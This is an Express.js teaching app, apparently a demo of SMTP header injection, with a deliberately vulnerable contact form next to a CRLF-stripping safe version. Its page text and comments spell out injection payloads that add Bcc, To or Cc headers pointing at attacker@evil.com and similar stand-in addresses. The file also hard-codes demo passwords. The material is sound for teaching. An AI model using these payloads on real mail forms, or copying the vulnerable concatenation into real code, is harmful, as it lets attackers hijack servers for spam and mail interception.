// app.js - SMTP Injection demonstration
// Dependencies: express, express-session, bcryptjs
// Install: npm install express express-session bcryptjs
//
// SMTP injection occurs when user-supplied values are concatenated directly into
// email header lines without stripping CRLF characters. Email headers are separated
// by CRLF (\r\n), exactly like HTTP headers. An attacker who controls a header value
// can inject \r\n to add new headers — the classic case is Bcc injection, which sends
// a hidden copy of every email to the attacker's address, using the server as a relay.

const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');

const app = express();

// ---------- Middleware ----------
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// ---------- Sessions ----------
app.use(
  session({
    name: 'sid',
    secret: process.env.SESSION_SECRET || 'change-this-session-secret',
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      sameSite: 'lax',
      // secure: true, // enable when serving over HTTPS
      maxAge: 1000 * 60 * 60
    }
  })
);

// ---------- In-memory users for session auth ----------
const seedUsers = [
  { username: 'alice', password: 'password1', role: 'admin' },
  { username: 'bob',   password: 'password2', role: 'user'  }
];
const USERS = Object.fromEntries(
  seedUsers.map(u => [
    u.username,
    { username: u.username, role: u.role, passwordHash: bcrypt.hashSync(u.password, 10) }
  ])
);

// ---------- Helpers ----------
function requireAuth(req, res, next) {
  if (req.session?.user) return next();
  return res.status(401).send(`
    <h1>401 Unauthorized</h1>
    <p>You must <a href="/login">log in</a> to access this page.</p>
  `);
}

function requireRole(role) {
  return (req, res, next) => {
    if (req.session?.user?.role === role) return next();
    return res.status(403).send('<h1>403 Forbidden</h1><p>Insufficient permissions.</p>');
  };
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Strip CR and LF — the essential mitigation for any value going into an email header.
// The message body is exempt: newlines there are normal and expected.
function stripCrlf(s) {
  return String(s).replace(/[\r\n]/g, '');
}

// ---------- Email preview helper ----------
// Renders the RFC 2822 email that would be sent as HTML. Each header value is split
// on CRLF: the first line is displayed normally; any extra lines are injected and
// shown in red. Name and fromEmail are checked independently so injections in either
// are isolated and clearly labelled.
function emailPreviewHtml(name, fromEmail, subject, message) {
  const date = new Date().toUTCString();

  function renderHeader(label, value) {
    const parts = String(value).split(/\r\n|\r|\n/);
    let html = escapeHtml(`${label}: ${parts[0]}`) + '\n';
    for (let i = 1; i < parts.length; i++) {
      if (parts[i]) {
        html += `<span style="color:red;font-weight:bold">${escapeHtml(parts[i])} ← injected</span>\n`;
      }
    }
    return html;
  }

  // From header: name and fromEmail are separate injection points.
  const nameParts  = String(name).split(/\r\n|\r|\n/);
  const emailParts = String(fromEmail).split(/\r\n|\r|\n/);
  let html = escapeHtml(`From: "${nameParts[0]}" <${emailParts[0]}>`) + '\n';
  for (let i = 1; i < nameParts.length; i++) {
    if (nameParts[i]) html += `<span style="color:red;font-weight:bold">${escapeHtml(nameParts[i])} ← injected</span>\n`;
  }
  for (let i = 1; i < emailParts.length; i++) {
    if (emailParts[i]) html += `<span style="color:red;font-weight:bold">${escapeHtml(emailParts[i])} ← injected</span>\n`;
  }

  html += escapeHtml('To: support@company.com') + '\n';
  html += renderHeader('Subject', subject);
  html += escapeHtml(`Date: ${date}`) + '\n';
  html += escapeHtml('MIME-Version: 1.0') + '\n';
  html += escapeHtml('Content-Type: text/plain; charset=utf-8') + '\n';
  html += '\n';
  html += escapeHtml(message) + '\n';
  return html;
}

// ---------- Templates ----------
const nav = (user) => `
  <nav>
    <a href="/">Home</a> |
    <a href="/dashboard">Dashboard</a> |
    <a href="/admin">Admin</a> |
    <a href="/contact">Contact Us</a> |
    <a href="/contact-safe">Contact Us (Safe)</a> |
    <a href="/login">${user ? 'Switch user' : 'Login'}</a>
    ${user ? ' | <form style="display:inline" method="post" action="/logout"><button>Logout</button></form>' : ''}
  </nav>
  <hr>
`;

const page = (title, body, user) => `
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>${title}</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
</head>
<body>
  ${nav(user)}
  ${body}
</body>
</html>
`;

// ---------- Routes ----------
app.get('/', (req, res) => {
  const user = req.session.user;
  res.send(page('SMTP Injection', `
    <h1>SMTP Injection</h1>
    <p>SMTP injection occurs when user-supplied input is concatenated directly into email header lines without stripping CRLF characters. Email headers are separated by CRLF sequences (<code>\r\n</code>), exactly like HTTP headers. An attacker who controls a header value — such as the sender name, reply-to address, or subject line — can inject <code>\r\n</code> to add new header lines. The most common exploit is <strong>Bcc injection</strong>: by appending <code>\r\nBcc: attacker@evil.com</code> to the subject, the attacker receives a hidden copy of every email the form sends, using the victim server's reputation and IP address as a spam relay.</p>
    <p>This example demonstrates SMTP injection through a Contact Us form. The vulnerable <a href="/contact">/contact</a> endpoint builds the email by string concatenation and displays a preview of the raw RFC 2822 email, with injected headers highlighted in red. The safe <a href="/contact-safe">/contact-safe</a> endpoint strips all CR and LF characters from header values before building the email.</p>

    <h2>How This App Works</h2>
    <p>No real email server is used — the app generates the raw RFC 2822 email text and shows it in the browser. The preview uses the same CRLF-split approach as the CRLF injection example: each header value is split on line breaks, and any lines beyond the first are marked as injected. Name and From email are checked as separate injection points; Subject is checked independently. The message body is not checked — newlines there are normal RFC 2822 content.</p>

    <h2>The Attack</h2>
    <p>On the <a href="/contact">/contact</a> page, type or paste the following into the Subject field (use a real newline, or URL-encode as <code>%0d%0a</code>):</p>
    <pre>Question about my order\r\nBcc: attacker@evil.com</pre>
    <p>The email preview becomes:</p>
    <pre>From: "Alice" &lt;alice@example.com&gt;
To: support@company.com
Subject: Question about my order
Bcc: attacker@evil.com    ← injected
Date: ...
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

Hello, I have a question...</pre>
    <p>A mail transfer agent receiving this message would deliver a copy to <code>attacker@evil.com</code>. Applied to a "send to friend" or bulk notification form, the same technique turns the server into a spam relay.</p>

    <h2>Try It</h2>
    <ul>
      <li>Log in as <code>alice / password1</code> (admin) or <code>bob / password2</code> (user)</li>
      <li>Visit <a href="/contact">/contact</a> — submit a normal message — preview shows a clean email</li>
      <li>Enter a Subject containing a newline then <code>Bcc: attacker@evil.com</code> — injected Bcc appears in red</li>
      <li>Enter a Name containing <code>\r\nTo: extra@victim.com</code> — adds an extra To address</li>
      <li>Enter a From email containing <code>\r\nCc: cc@evil.com</code> — CC injection via the address field</li>
      <li>Visit <a href="/contact-safe">/contact-safe</a> and try the same payloads — newlines stripped, one clean header per field</li>
    </ul>

    ${user ? `<p>Currently logged in as <strong>${user.username}</strong> (${user.role}).</p>` : '<p>You are not logged in.</p>'}
  `, user));
});

app.get('/login', (req, res) => {
  const user = req.session.user;
  res.send(page('Login', `
    <h1>Login</h1>
    <form method="post" action="/login">
      <label for="username">Username</label><br>
      <input id="username" name="username" autocomplete="username" required><br><br>
      <label for="password">Password</label><br>
      <input id="password" name="password" type="password" autocomplete="current-password" required><br><br>
      <button type="submit">Sign in</button>
    </form>
    ${user ? `<p>Already logged in as <strong>${user.username}</strong>. <a href="/">Go home</a> or log out below.</p>` : ''}
  `, user));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body || {};
  const record = USERS[username];
  if (!record || !bcrypt.compareSync(password, record.passwordHash)) {
    return res.status(401).send(page('Login failed', '<p>Invalid credentials.</p><p><a href="/login">Try again</a></p>'));
  }
  req.session.user = { username: record.username, role: record.role };
  res.redirect('/dashboard');
});

app.post('/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/'));
});

app.get('/dashboard', requireAuth, (req, res) => {
  const user = req.session.user;
  res.send(page('Dashboard', `
    <h1>Dashboard</h1>
    <p>Welcome, <strong>${user.username}</strong>. Your role is <strong>${user.role}</strong>.</p>
    <p>This page is visible to any authenticated user.</p>
    <p><a href="/contact">Contact Us (vulnerable)</a> | <a href="/contact-safe">Contact Us (safe)</a></p>
  `, user));
});

app.get('/admin', requireAuth, requireRole('admin'), (req, res) => {
  const user = req.session.user;
  res.send(page('Admin', `
    <h1>Admin</h1>
    <p>Only admins can see this. Hello, <strong>${user.username}</strong>.</p>
  `, user));
});

app.get('/api/me', requireAuth, (req, res) => {
  res.json({ user: req.session.user, ok: true });
});

// ---------- Contact form (vulnerable) ----------
const contactForm = (values, preview, user) => page('Contact Us', `
  <h1>Contact Us</h1>
  <p>Send a message to our support team. All header fields are built by string concatenation — newlines in any field inject additional email headers.</p>
  <form method="post" action="/contact">
    <label for="name">Your Name</label><br>
    <input id="name" name="name" value="${escapeHtml(values.name)}"
      placeholder="e.g. Alice Smith" style="width:400px"><br><br>
    <label for="fromEmail">Your Email</label><br>
    <input id="fromEmail" name="fromEmail" value="${escapeHtml(values.fromEmail)}"
      placeholder="e.g. alice@example.com" style="width:400px"><br><br>
    <label for="subject">Subject</label><br>
    <input id="subject" name="subject" value="${escapeHtml(values.subject)}"
      placeholder="e.g. Question about my order" style="width:400px"><br><br>
    <label for="message">Message</label><br>
    <textarea id="message" name="message" rows="4" style="width:400px">${escapeHtml(values.message)}</textarea><br><br>
    <button type="submit">Send Message</button>
  </form>
  ${preview !== null ? `
    <h2>Raw email that would be sent</h2>
    <pre style="background:#f8f8f8;border:1px solid #ccc;padding:12px;line-height:1.6">${preview}</pre>
  ` : ''}
`, user);

app.get('/contact', (req, res) => {
  res.send(contactForm({ name: '', fromEmail: '', subject: '', message: '' }, null, req.session.user || null));
});

app.post('/contact', (req, res) => {
  const { name = '', fromEmail = '', subject = '', message = '' } = req.body || {};
  // VULNERABLE: user-supplied values placed directly into email header lines.
  // A \r\n anywhere in name, fromEmail, or subject injects an additional header.
  // Injecting \r\nBcc: attacker@evil.com into the subject makes every email
  // sent through this form also deliver a copy to the attacker's address.
  const preview = emailPreviewHtml(name, fromEmail, subject, message);
  res.send(contactForm({ name, fromEmail, subject, message }, preview, req.session.user || null));
});

// ---------- Contact form (safe) ----------
const contactSafeForm = (values, preview, user) => page('Contact Us (Safe)', `
  <h1>Contact Us (Safe)</h1>
  <p>Send a message to our support team. CR and LF characters are stripped from all header values before the email is built — injection is not possible.</p>
  <form method="post" action="/contact-safe">
    <label for="name">Your Name</label><br>
    <input id="name" name="name" value="${escapeHtml(values.name)}"
      placeholder="e.g. Alice Smith" style="width:400px"><br><br>
    <label for="fromEmail">Your Email</label><br>
    <input id="fromEmail" name="fromEmail" value="${escapeHtml(values.fromEmail)}"
      placeholder="e.g. alice@example.com" style="width:400px"><br><br>
    <label for="subject">Subject</label><br>
    <input id="subject" name="subject" value="${escapeHtml(values.subject)}"
      placeholder="e.g. Question about my order" style="width:400px"><br><br>
    <label for="message">Message</label><br>
    <textarea id="message" name="message" rows="4" style="width:400px">${escapeHtml(values.message)}</textarea><br><br>
    <button type="submit">Send Message</button>
  </form>
  ${preview !== null ? `
    <h2>Raw email that would be sent</h2>
    <pre style="background:#f8f8f8;border:1px solid #ccc;padding:12px;line-height:1.6">${preview}</pre>
  ` : ''}
`, user);

app.get('/contact-safe', (req, res) => {
  res.send(contactSafeForm({ name: '', fromEmail: '', subject: '', message: '' }, null, req.session.user || null));
});

app.post('/contact-safe', (req, res) => {
  const { name = '', fromEmail = '', subject = '', message = '' } = req.body || {};
  // Safe: strip CR and LF from every value that goes into an email header.
  // The message body is intentionally exempt — newlines there are normal content.
  const safeName      = stripCrlf(name);
  const safeFromEmail = stripCrlf(fromEmail);
  const safeSubject   = stripCrlf(subject);
  const preview = emailPreviewHtml(safeName, safeFromEmail, safeSubject, message);
  res.send(contactSafeForm({ name, fromEmail, subject, message }, preview, req.session.user || null));
});

// ---------- Start ----------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`App running at http://localhost:${PORT}`);
});
